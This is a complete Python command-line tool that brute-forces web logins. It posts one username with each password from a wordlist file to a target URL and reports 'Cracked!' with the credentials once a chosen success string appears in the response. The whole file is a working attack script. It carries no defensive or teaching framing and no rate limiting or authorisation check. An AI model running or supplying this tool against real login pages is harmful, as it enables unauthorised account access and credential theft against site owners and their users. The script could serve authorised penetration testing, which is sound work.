#!/usr/bin/env python3

import click
import requests
import logging


@click.command()
@click.argument('url')
@click.argument('username')
@click.argument('password_file', type=click.File('r'))
@click.argument('success_string')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose output')
def http_brute(url, username, password_file, success_string, verbose):

    if verbose:
        logging.basicConfig(level=logging.INFO)
    else:
        logging.basicConfig(level=logging.ERROR)

    with password_file as f:
        passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        logging.error("No passwords found in the file.")
        return

    for password in passwords:
        try:
            response = requests.post(url, data = {'username': username, 'password': password}, timeout=30)
            logging.info('Attempt for user {} (password masked). Status: {}'.format(username, response.status_code))
            if success_string in response.text:
                print('Cracked! Username: {}, Password: {}'.format(username, password))
                break
        except requests.exceptions.RequestException as e:
            logging.error('Request failed for {}: {}'.format(url, e))
            continue
        except Exception as e:
            logging.error('An unexpected error occurred: {}'.format(e))
            continue


if __name__ == '__main__':
    http_brute()